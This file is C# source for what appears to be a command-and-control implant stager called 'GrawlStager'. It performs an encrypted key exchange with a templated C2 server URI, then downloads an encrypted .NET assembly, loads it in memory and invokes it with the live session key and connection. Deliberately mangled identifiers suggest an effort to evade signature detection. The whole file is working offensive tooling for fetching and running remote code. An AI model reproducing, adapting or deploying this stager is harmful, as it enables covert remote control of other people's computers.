using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;

namespace GrawlStager
{
    public class GrawlStager
    {
        public GrawlStager()
        {
            ExecLevel();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new GrawlStager();
        }
        public static void Execute()
        {
            new GrawlStager();
        }

		public void ExecLevel()
        {
            try
            {
                string RedWolfURI = @"{{REP_REDWOLF_URI}}";
                string ProfileWriteFormat = @"{{REP_PROF_WRITE_FORMAT}}".Replace(Environment.NewLine, "\n");
                string ProfileReadFormat = @"{{REP_PROF_READ_FORMAT}}".Replace(Environment.NewLine, "\n");

                Random random = new Random();
                string aANOTHERID = @"{{REP_GRAWL_ANOTHERID}}";
                string ANOTHERID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] SetupKeyBytes = Convert.FromBase64String(@"{{REP_GRAWL_SHARED_SECRET_PASSWORD}}");
                string MessageFormat = @"{{""ANOTHERID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncMsg"":""{4}"",""HMAC"":""{5}""}}";

                Aes InstallAESKey = Aes.Create();
                InstallAESKey.Mode = CipherMode.CBC;
                InstallAESKey.Padding = PaddingMode.PKCS7;
                InstallAESKey.Key = SetupKeyBytes;
                InstallAESKey.GenerateIV();
                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());

                byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                byte[] EncryptedRSAPublicKey = InstallAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);
                byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
                string FirstBody = String.Format(MessageFormat, aANOTHERID + ANOTHERID, "0", "", Convert.ToBase64String(InstallAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));

                string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(FirstBody));
                BridgeMessenger meSsenGer = new BridgeMessenger(RedWolfURI, ANOTHERID, ProfileWriteFormat);
				meSsenGer.Connect();
				meSsenGer.Write(String.Format(ProfileWriteFormat, transformedResponse, ANOTHERID));
                string FirstResponse = meSsenGer.Read().Message;
                string extracted = Parse(FirstResponse, ProfileReadFormat)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                List<string> parsed = Parse(extracted, MessageFormat);
                string iv64str = parsed[3];
                string messAgE64str = parsed[4];
                string hash64str = parsed[5];
                byte[] messAgEbytes = Convert.FromBase64String(messAgE64str);

                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messAgEbytes))) { return; }
                InstallAESKey.IV = Convert.FromBase64String(iv64str);
                byte[] Partdecrypted = InstallAESKey.CreateDecryptor().TransformFinalBlock(messAgEbytes, 0, messAgEbytes.Length);
                byte[] Fulldecrypted = rsa.Decrypt(Partdecrypted, true);

                Aes SessKEy = Aes.Create();
                SessKEy.Mode = CipherMode.CBC;
                SessKEy.Padding = PaddingMode.PKCS7;
                SessKEy.Key = Fulldecrypted;
                SessKEy.GenerateIV();
                hmac = new HMACSHA256(SessKEy.Key);
                byte[] challenge1 = new byte[4];
                RandomNumberGenerator rng = RandomNumberGenerator.Create();
                rng.GetBytes(challenge1);
                byte[] EncChallEnge1 = SessKEy.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);
                hash = hmac.ComputeHash(EncChallEnge1);

                string SeccondBody = String.Format(MessageFormat, ANOTHERID, "1", "", Convert.ToBase64String(SessKEy.IV), Convert.ToBase64String(EncChallEnge1), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(SeccondBody));
                string formatted = String.Format(ProfileWriteFormat, transformedResponse, ANOTHERID);
				meSsenGer.Write(formatted);
				string SeccondResponse = meSsenGer.Read().Message;
                extracted = Parse(SeccondResponse, ProfileReadFormat)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                messAgE64str = parsed[4];
                hash64str = parsed[5];
                messAgEbytes = Convert.FromBase64String(messAgE64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messAgEbytes))) { return; }
                SessKEy.IV = Convert.FromBase64String(iv64str);

                byte[] DecryptChallEnges = SessKEy.CreateDecryptor().TransformFinalBlock(messAgEbytes, 0, messAgEbytes.Length);
                byte[] challenge1Test = new byte[4];
                byte[] challenge2 = new byte[4];
                Buffer.BlockCopy(DecryptChallEnges, 0, challenge1Test, 0, 4);
                Buffer.BlockCopy(DecryptChallEnges, 4, challenge2, 0, 4);
                if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }

                SessKEy.GenerateIV();
                byte[] EncChallEnge2 = SessKEy.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);
                hash = hmac.ComputeHash(EncChallEnge2);

                string ThirdBody = String.Format(MessageFormat, ANOTHERID, "2", "", Convert.ToBase64String(SessKEy.IV), Convert.ToBase64String(EncChallEnge2), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(ThirdBody));
                meSsenGer.Write(String.Format(ProfileWriteFormat, transformedResponse, ANOTHERID));
				string ThirdResponse = meSsenGer.Read().Message;
                extracted = Parse(ThirdResponse, ProfileReadFormat)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                messAgE64str = parsed[4];
                hash64str = parsed[5];
                messAgEbytes = Convert.FromBase64String(messAgE64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messAgEbytes))) { return; }
                SessKEy.IV = Convert.FromBase64String(iv64str);
                byte[] DecryptedAssembly = SessKEy.CreateDecryptor().TransformFinalBlock(messAgEbytes, 0, messAgEbytes.Length);
                Assembly grawlAssembly = Assembly.Load(DecryptedAssembly);
                grawlAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { RedWolfURI, ANOTHERID, SessKEy, meSsenGer.client });
            }
            catch (Exception e) { Console.Error.WriteLine(e.Message); }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'grp0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'grp1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'grp2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'grp3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'grp4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'grp5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["grp0"] != null) { matches.Add(match.Groups["grp0"].Value); }
            if (match.Groups["grp1"] != null) { matches.Add(match.Groups["grp1"].Value); }
            if (match.Groups["grp2"] != null) { matches.Add(match.Groups["grp2"].Value); }
            if (match.Groups["grp3"] != null) { matches.Add(match.Groups["grp3"].Value); }
            if (match.Groups["grp4"] != null) { matches.Add(match.Groups["grp4"].Value); }
            if (match.Groups["grp5"] != null) { matches.Add(match.Groups["grp5"].Value); }
            return matches;
        }

		// {{REP_BRIDGE_MESSENGER_CODE}}

		// {{REP_PROF_MESSAGE_TRANSFORM}}
	}
}